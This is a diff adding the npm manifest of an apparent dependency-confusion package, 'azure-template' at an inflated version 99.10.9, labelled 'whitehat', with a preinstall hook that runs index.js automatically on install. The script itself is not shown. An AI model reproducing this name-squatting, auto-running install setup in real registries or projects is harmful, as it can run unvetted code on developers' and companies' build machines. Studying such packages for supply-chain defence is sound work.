@@ -1,0 +1,39 @@
+{
+    "name": "azure-template",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "azure-template@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-PRUDsdvg169k93PCu/05UKtjehgvixYI6cdZAsmV/NP65OHGwjGkI8Wv7b6yd/pesBy4xdJf19/T3dNUqJ8YaQ==",
+        "shasum": "9b50c86348558b59eb727d08da704f4341cb2d62",
+        "tarball": "https://registry.npmjs.org/azure-template/-/azure-template-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3578,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhoSqaCRA9TVsSAnZWagAAeAgP/iZ57AQZVv8N2JYXlwuh\nsRn9RORIUz11XiqYzp3DETMoXQbwkuZNXKti4Vd5UodzSWBmDrptcc3NjKW8\nDowZl49LjCGEThV11A2D0Dp3l1jWBuWoi/qsylJJ2bmTGYF6YYgdln1P6oV0\nl995GnnrchQoXdCcZqjL1s5or1FbZG4WCRKNBaYaFWCaZ9I7paF11hHMiwCQ\ndvq4fHSwxXEUtlGW3xDaHjGJF1AJzbzPtgoAvuGnrj/Iu0Gr7kauK/eMSArY\n5VfPbI7HrkZ0RkJNoolDccDGaEjhe55EjOS0EWge8rAxSvqSYJP48saBQg/I\ncE2tvyYwBMIm7PFqDJ0Ufq4EKlWH+n6u+cWri+vNVce7SSWXWpRyt/HXIZco\nCXGg7kA6XKHBwSeM00ySio8tdVJe/zBVVXZjA08627Gt9PsBp03OwZbRw652\nISufZ5gbBzhASJR+6afVJmCuwBsTUA3LRm8Sj94KFFWNxWjVZC2o9BRDNB/E\nXdLcp+LLOtBPEcts99IjX9r0pluzEZjdV3oqG+LCJ2B+prp1bRzWIgz6dc9H\nOaeYHhf3E+QmlnpxWcaSzYNZ9hK9v4genBQgC3CKKRBcoj/kor/MKluIS9MI\nZahujFuOrprSjJ4OQL8NZlcEiY+nvSqgYzCN0qM3i/AKRC1g3OOIScfiK8h5\nfw4a\r\n=EBeE\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "azure-tests",
+        "email": "hussam.tes08+3@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "azure-tests",
+            "email": "hussam.tes08+3@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/azure-template_99.10.9_1637952154343_0.35284203182570484"
+    },
+    "_hasShrinkwrap": false
+}
